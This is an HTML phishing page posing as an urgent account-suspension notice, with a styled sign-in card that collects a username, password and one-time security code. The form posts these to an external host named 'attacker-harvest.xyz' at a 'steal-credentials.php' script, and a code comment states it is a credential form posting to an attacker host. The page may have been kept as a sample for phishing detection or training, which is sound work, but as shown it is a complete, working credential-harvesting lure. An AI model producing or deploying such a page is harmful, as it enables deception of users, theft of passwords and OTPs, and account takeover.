<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Verification — Urgent Security Action Required</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0f172a;
      color: #f8fafc;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .login-card {
      background: #1e293b;
      border: 1px solid #ef4444;
      border-radius: 12px;
      padding: 32px;
      max-width: 440px;
      width: 100%;
      box-shadow: 0 10px 40px rgba(239, 68, 68, 0.2);
    }
    .alert-header {
      background: rgba(239, 68, 68, 0.15);
      border: 1px solid rgba(239, 68, 68, 0.4);
      color: #fca5a5;
      padding: 12px;
      border-radius: 8px;
      font-size: 13px;
      line-height: 1.4;
      margin-bottom: 20px;
    }
    h2 { margin: 0 0 10px 0; font-size: 20px; color: #ffffff; }
    .form-group {
      margin-bottom: 14px;
      text-align: left;
    }
    label { display: block; font-size: 12px; color: #94a3b8; margin-bottom: 4px; }
    input {
      width: 100%;
      box-sizing: border-box;
      padding: 10px;
      background: #0f172a;
      border: 1px solid #475569;
      color: #ffffff;
      border-radius: 6px;
      font-size: 14px;
    }
    button {
      width: 100%;
      background: #ef4444;
      color: #ffffff;
      border: none;
      padding: 12px;
      border-radius: 6px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 8px;
    }
  </style>
</head>
<body>
  <div class="login-card">
    <div class="alert-header">
      ⚠️ <strong>Account Suspended:</strong> Immediate action required! Your account will be closed within 24 hours. Verify your identity and enter your OTP to restore access.
    </div>
    <h2>Sign in to restore your account</h2>
    
    <!-- Cross-domain credential form: posts to external attacker host -->
    <form action="https://attacker-harvest.xyz/steal-credentials.php" method="POST">
      <div class="form-group">
        <label for="username">Email or Username</label>
        <input type="text" id="username" name="username" placeholder="user@example.com" required>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="••••••••" required>
      </div>
      <div class="form-group">
        <label for="otp">Security Code / OTP</label>
        <input type="text" id="otp" name="otp" placeholder="6-digit code">
      </div>
      <button type="submit">Verify Identity Now</button>
    </form>
  </div>
</body>
</html>
